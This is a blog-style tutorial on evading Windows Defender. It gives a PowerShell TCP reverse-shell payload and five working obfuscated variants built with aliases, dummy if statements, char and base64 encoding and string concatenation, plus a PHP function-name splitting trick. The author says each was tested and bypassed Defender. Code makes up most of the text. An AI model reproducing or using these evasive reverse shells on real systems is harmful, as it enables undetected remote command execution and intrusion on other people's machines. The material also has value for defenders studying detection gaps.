## Intro to simple AV evasion techniques

This post/blog/whatever serves as an introduction to ~~playing 'hide the naughty string(s)'~~ evading AV. 
I'm by no means an expert, I barely know what I'm doing, but hopefully you'll be able to learn something anyway.
All payloads were tested, found functional and capable of bypassing Defender as per date of writing.

Anti virus (AV from now on) evasion is easier than one might think. 
AV mainly rely on known signatures/strings, so, if we're able to write a malicious string/function/variable/script/whatever that's functionally the same code wise, but looks different to the AV, we can usually trick them and run whatever code we want without any complaints. 
This is especially true for Windows Defender, as you will soon realize. 
A misconception amongst some security enthusiasts seems to be that we need AMSI bypass payloads to run malicious Powershell code like reverse shells on Windows, but we simply don't.

We're gonna be using the following classic Powershell reverse shell payload as our "base template" (courtesy of revshells.com). 
Attempting to run the following payload on Windows will cause the classic 'This script contains malicious content and has been blocked by your antivirus software.' error code, thanks to Defender. 

```powershell
$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',9001);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```
No shell. Bummer!

-----------------------------------
## Example 1. Silliness...
Let's start out easy. This one's silly, but it works nevertheless.

```powershell
$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',9001);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
```

See the difference? Yup, we just removed the very last line containing $client.Close(), and Defender happily lets it pass through, providing us with a shell. 
It's probably not best practice to remove .Close(), but whatever, it gives us an easy and functional shell. 
So, that's it, right? We've learned all we need to know about evading Defender? Nope! We can get *so much more* creative.



-----------------------------------
## Example 2. Alias.
Let's try some *actual* evasion. In Powershell we have functions like New-Object, Invoke-Expression, and so on.
May I introduce you to Set-Alias! This function let's us make up our own alias names for functions. We could use this to set a new name for, let's say, New-Object, and replace any references of New-Object with our own alias in the code. 
In the following snippet I've added Set-Alias and replaced "New-Object" with "NO".

```powershell
Set-Alias -Name NO -Value New-Object
$client = NO System.Net.Sockets.TCPClient('127.0.0.1',9001);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
    $data = (NO -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```
And wouldn't you know it, Defender lets it straight through, and we get a shell! 
A lot of AV software seems to trigger on "New-Object", "Invoke-Expression" and so on written in certain contexts, so we're lucky we can easily just rename those functions! 

-----------------------------------
## Example 3. Logic confusion.
This one is a bit weird and silly I will admit. Since I don't know the inner workings of Defender, I can only make poor guesstimates here as to why and how, so I'm dubbing this one "logic confusion" for the sake of my own sanity. We add a random and needless if statement anywhere in the code between line 2 and 8, and then another needless if statement inside of the first one.
```powershell
$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',9001);
if ( 1 -eq 1 ) {if ( 1 -eq 1 ) {};};
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
 
```
Aaaand sure enough, Defender lets it through. Shell time!
It's a weird one. If the nested if statements are placed on line 1, Defender catches it. If placed anywhere after line 8, Defender catches it.
I also found that I was able to use a single non-nested if statement anywhere in the code, and only needed to rename a single variable to an extra long variable name, in order to bypass Defender.

-----------------------------------
## Example 4. Obfuscation via encoding.
Alright, this one's more of a classic. We're using the char functionality to hide a string in the script (line 3, in this case), which we invoke right after, so we don't lose out on the functionality.
```powershell
$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',9001);
$stream = $client.GetStream();
iex(-join([char[]](091,098,121,116,101,091,093,093,036,098,121,116,101,115,061,048,046,046,054,053,053,051,053,124,037,123,048,125)));
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```
 While running this payload without iex/invoke-expression on line 3 would be possible if ran as a local script file (and with Defender turned off, char in itself isn't enough in this case), it would fail if we encoded the payload to base64 and attempted to run it as an encoded command. We use invoke-expression so that it will work no matter the scenario, and also to confuse Defender a bit, as the combination of iex and char seems to do the trick. 
 Hex, base64 and so on works fine for this kind of approach, by hiding strings in encoded forms and converting them back as needed.
 
 An example of using base64 encoding. We encode the entire inside of the while loop to base64 (UTF-16LE), and invoke it.
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',9001);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
	iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('IAAgACAAIAAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAKACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAKACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsACgAgACAAIAAgACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsACgAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkA')));
};
$client.Close()
```
 Oh, and of course, we get a shell in both cases. 
 
 -----------------------------------
 
 ## Example 5. Concatenation. 
 We can take known strings that gets detected, "chop them up" then join them back together and invoke them when needed to avoid detection. 
 We can even use this approach in languages like PHP, where " system() " often gets flagged by AV, but " ('sys'.'tem')() " doesn't, while functionally remaining the same.
 We change the $client variable on line 1, chop up its' value and split it over two variables, join them back together and invoke them.
 ```powershell
$a = (-join("New","-","Object"));
$b = (-join("System.","Net.","Sockets.","TCP","Client","('127.0.0.1',9001)"));
$c = $a + " " + $b;
$client = iex($c);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```
You might've guessed it, we get a shell. Defender sees no issues with this payload either.

-----------------------------------


## Conclusion.
As has been demonstrated, there's a multitude of ways to evade Defender and get that sweet, sweet reverse shell from a Windows box without too much hassle, even on a newly updated machine. 
It is even possible, by using a mix of above mentioned techniques, to produce a payload that doesn't get picked up by any AV whatsoever.
I'm most certainly no developer and only have a couple of weeks of experience with Powershell (as of date of writing), but I'm certain there's so many more ways to go about this that I haven't learned/thought of yet.
Hopefully this will help other security researchers to have an easier time dealing with Windows machines in the future, by knowing just how trivial it can be to get around Defender. 
I hope you enjoyed the read and found it helpful ( if not, go easy on me, I'm a n00b and it's my first try at this kinda shit, kthx <3 ).


- N1z0ku